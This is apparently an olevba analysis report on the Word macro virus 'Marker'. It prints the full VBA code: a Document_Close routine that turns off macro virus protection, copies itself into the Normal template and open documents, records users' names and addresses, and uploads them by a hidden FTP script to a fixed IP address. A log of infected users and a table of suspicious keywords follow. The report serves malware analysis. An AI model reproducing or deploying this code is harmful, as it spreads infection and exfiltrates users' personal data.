olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-f01ee554bbb314793f99bc7c4ae282b592f09081
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-f01ee554bbb314793f99bc7c4ae282b592f09081 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
Dim a, b, c, Msg, Style, Title, Response
a = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\äèðåêòîð\äîêóìåíòû\Ukaz.doc"
b = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä1\êëàäîâùèê\âõîä\1Ukaz.doc"
c = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\êëàäîâùèê\âõîä\2Ukaz.doc"

ActiveWindow.Close SaveChanges:=wdSaveChanges


Msg = "Âû äåéñòâèòåëüíî õîòèòå îòïðàâèòü ôàéë?"  ' Ñîîáùåíèå.
Style = vbYesNo + vbDefaultButton2  ' Êíîïêè.
Title = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response = MsgBox(Msg, Style, Title)


If Response = vbYes Then ' Íàæàòà êíîïêà "Äà" (Yes).
FileCopy a, b
FileCopy a, c


End If



End Sub

Private Sub CommandButton2_Click()
Dim Msg, Style, Title, Response, MyTime
Msg = "Âû õîòèòå âûïîëíèòü ïëàí çà ïåðâûé êâàðòàë?"  ' Ñîîáùåíèå.
Style = vbYesNo + vbDefaultButton2  ' Êíîïêè.
Title = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response = MsgBox(Msg, Style, Title)


If Response = vbYes Then    ' Íàæàòà êíîïêà "Äà" (Yes).
MyTime = #4:00:00 PM#   ' Ïðèñâàèâàåò âðåìÿ.
Time = MyTime   ' Èçìåíÿåò ñèñòåìíîå âðåìÿ.
Else    ' Íàæàòà êíîïêà "Íåò" (No).

End If

End Sub

Private Sub CommandButton3_Click()
Dim Msg, Style, Title, Response, MyTime
Msg = "Âû õîòèòå âûïîëíèòü ïëàí çà âòîðîé êâàðòàë?"  ' Ñîîáùåíèå.
Style = vbYesNo + vbDefaultButton2  ' Êíîïêè.
Title = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response = MsgBox(Msg, Style, Title)


If Response = vbYes Then    ' Íàæàòà êíîïêà "Äà" (Yes).
MyTime = #4:40:00 PM#   ' Ïðèñâàèâàåò âðåìÿ.
Time = MyTime   ' Èçìåíÿåò ñèñòåìíîå âðåìÿ.
Else    ' Íàæàòà êíîïêà "Íåò" (No).
End If
End Sub

Private Sub CommandButton4_Click()
Dim i
Set fs = Application.FileSearch
With fs
    .LookIn = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\äèðåêòîð\âõîä"

    .FileName = "*.*"
    If .Execute > 0 Then
        MsgBox "Íàéäåíî " & .FoundFiles.Count & _
            " ôàéë(îâ) "
        For i = 1 To .FoundFiles.Count
            MsgBox .FoundFiles(i)
        Next i
    Else
        MsgBox "Äîêóìåíòîâ íà âõîäå íå îáíîðóæåíî"
    End If
End With

End Sub

Private Sub CommandButton5_Click()
Dim Msg2, Style2, Title2, Response2, Msg1, Style1, Title1, Response1



If Time > #4:00:00 PM# And Time < #4:40:00 PM# Then


Msg1 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó ïåðâîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style1 = vbOKOnly
Title1 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response1 = MsgBox(Msg1, Style1, Title1)
Else

If Time > #4:40:00 PM# And Time < #5:40:00 PM# Then


Msg2 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó âòîðîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style2 = vbOKOnly
Title2 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response2 = MsgBox(Msg2, Style2, Title2)


End If
End If



End Sub

Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 02:30:56 PM - Tuesday, 22 Dec 1998
' bd04619
'



' 04:15:52 PM - Monday, 4 Jan 1999
' ss04789
'



' 10:10:52 AM - Wednesday, 6 Jan 1999
' JDIETZ
'



' 03:10:02 PM - Saturday, 23 Jan 1999
' W95INST
'



' 02:27:40 PM - Tuesday, 26 Jan 1999
' cbreivis
'



' 12:39:01 PM - Monday, 1 Feb 1999
' C & L User
'



' 02:21:53  - Friday, 5 Feb 1999
' Davidson
'



' 04:35:17  - Monday, 8 Feb 1999
' uperstl
'



' 03:43:33 PM - Tuesday, 16 Feb 1999
' rkeeble
'



' 02:28:15 PM - Thursday, 18 Feb 1999
' pcosgrov
'



' 09:27:24  - Friday, 19 Feb 1999
' lyoung
'



' 02:29:29  - Tuesday, 23 Feb 1999
' Giuseppe Bacco
'



' 06:23:45  - Tuesday, 23 Feb 1999
' jstewart
'



' 03:27:12  - âòîðíèê, 2 ìàð 1999
' Korneyev
' Óêðà¿íà, 252030, ì.Êè¿â, âóë. Á.Õìåëüíèöüêîãî, 46
' ÒÎÂ "Ïåðñïåêòèâà-ÒÁ"



' 06:03:31  - ïîíåäåëüíèê, 3 ìàð 1997
' Administrator
'



' 06:14:34  - ïîíåäåëüíèê, 22 ìàð 1999
' den
'



' 01:13:08  - ïÿòíèöà, 2 àïð 1999
' Äÿäþí
'



' 12:50:38  - ïÿòíèöà, 9 àïð 1999
' AMI
'



' 02:32:27  - âòîðíèê, 20 àïð 1999
' Äìèòðåíêî À.È.
'



' 02:00:19  - ñóááîòà, 15 ìàé 1999
' USER9
'



' 11:06:06  - ñðåäà, 19 ìàé 1999
' st8
'



' 05:02:54  - ñðåäà, 19 ìàé 1999
' st3
'



' 02:38:25  - ñðåäà, 26 ìàé 1999
' st11
'



' 02:50:59  - ïÿòíèöà, 28 ìàé 1999
' st3
'



' 01:58:50  - â³âòîðîê, 7 Âåð 1999
' Ñòóäåíò
'



' 12:42:16  - ñðåäà, 13 îêò 1999
' Êàôåäðà
'



' 07:59:44  - ïîíåäåëüíèê, 22 íîÿ 1999
' Alex Afonin
'



' 04:54:45  - íåä³ëÿ, 12 Ãðã 1999
' Andrew
'



' 03:09:56  - ÷åòâåð, 19 Æîâ 2000
' User1
'



' 12:27:59  - ÷åòâåðã, 3 ôåâ 2000
' Äçþìêà Ìèõàèë ñâåò Èâàíîâè÷
' íåìà



' 02:57:49 PM - ñðåäà, 9 ôåâ 2000
' Ôåëèêñ
'



' 09:21:24  - âòîðíèê, 18 àïð 2000
' MAMA
'



' 01:04:50  - ñóááîòà, 24 èþí 2000
' GARIK
'



' 10:20:15  - â³âòîðîê, 11 Ëèï 2000
' ILONA
'



' 08:14:13  - ñóáîòà, 23 Âåð 2000
' User
'



' 09:12:18  - ñåðåäà, 4 Æîâ 2000
' Reanimator 99 CD
'



' 06:32:04  - ïîíåä³ëîê, 9 Æîâ 2000
' User
'



' 05:13:09 p.m. - lunes, 30 oct 2000
' Lab. Alcala Farma, S.L.
'



' 11:46:41 AM - Tuesday, 9 Jan 2001
' Ditry PC
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

